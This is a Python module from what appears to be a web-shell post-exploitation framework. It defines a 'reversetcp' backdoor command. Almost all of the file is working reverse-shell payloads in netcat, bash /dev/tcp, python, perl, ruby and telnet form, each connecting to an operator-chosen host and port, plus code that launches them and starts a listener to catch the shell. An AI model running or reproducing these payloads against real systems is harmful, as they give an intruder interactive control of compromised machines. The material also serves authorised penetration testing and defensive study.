from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
from modules.backdoor._reversetcp.tcpserver import TcpServer
from core.module import Module
from core.loggers import log
from core import messages
import socket

class Reversetcp(Module):

    """Execute a reverse TCP shell."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_vectors(
            [
            ShellCmd(
              """sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost} ${port} >/tmp/f""",
              name = 'netcat_bsd',
              target = Os.NIX,
              background = True
              ),
              ShellCmd(
                "sleep 1; nc -e ${shell} ${lhost} ${port}",
                name = 'netcat',
                target = Os.NIX,
                background = True
                ),
              ShellCmd(
                """sleep 1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["${shell}","-i"]);'""",
                name = 'python',
                target = Os.NIX,
                background = True
              ),
              ShellCmd(
                "sleep 1; /bin/bash -c \'${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0\'",
                name = 'devtcp',
                target = Os.NIX,
                background = True
              ),
              ShellCmd(
                """perl -e 'use Socket;$i="${lhost}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'""",
                name = 'perl',
                target = Os.NIX,
                background = True
              ),
              ShellCmd(
                """ruby -rsocket -e'f=TCPSocket.open("${lhost}",${port}).to_i;exec sprintf("${shell} -i <&%d >&%d 2>&%d",f,f,f)'""",
                name = 'ruby',
                target = Os.NIX,
                background = True
              ),
              ShellCmd(
                """sleep 1;rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet ${lhost} ${port} 0</tmp/backpipe | ${shell} 1>/tmp/backpipe""",
                name = 'telnet',
                target = Os.NIX,
                background = True
              ),
            ShellCmd(
              """sleep 1; python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("${shell}");'""",
              name = 'python_pty',
              target = Os.NIX,
              background = True
            )
            ]
        )

        self.register_arguments([
          { 'name' : 'lhost', 'help' : 'Local host' },
          { 'name' : 'port', 'help' : 'Port to spawn', 'type' : int },
          { 'name' : '-shell', 'help' : 'Specify shell', 'default' : '/bin/sh' },
          { 'name' : '-no-autoconnect', 'help' : 'Skip autoconnect', 'action' : 'store_true', 'default' : False },
          { 'name' : '-vector', 'choices' : self.vectors.get_names() }
        ])

    def run(self):

        # Run all the vectors
        for vector in self.vectors:

            # Skip vector if -vector is specified but does not match
            if self.args.get('vector') and self.args.get('vector') != vector.name:
                continue

            # Background run does not return results
            vector.run(self.args)

            # If set, skip autoconnect
            if self.args.get('no_autoconnect'): continue

            # Run tcp server for the vector
            try:
                tcpserver = TcpServer(self.args['port'])
            except socket.timeout as e:
                log.debug(messages.module_backdoor_reversetcp.error_timeout)
                continue
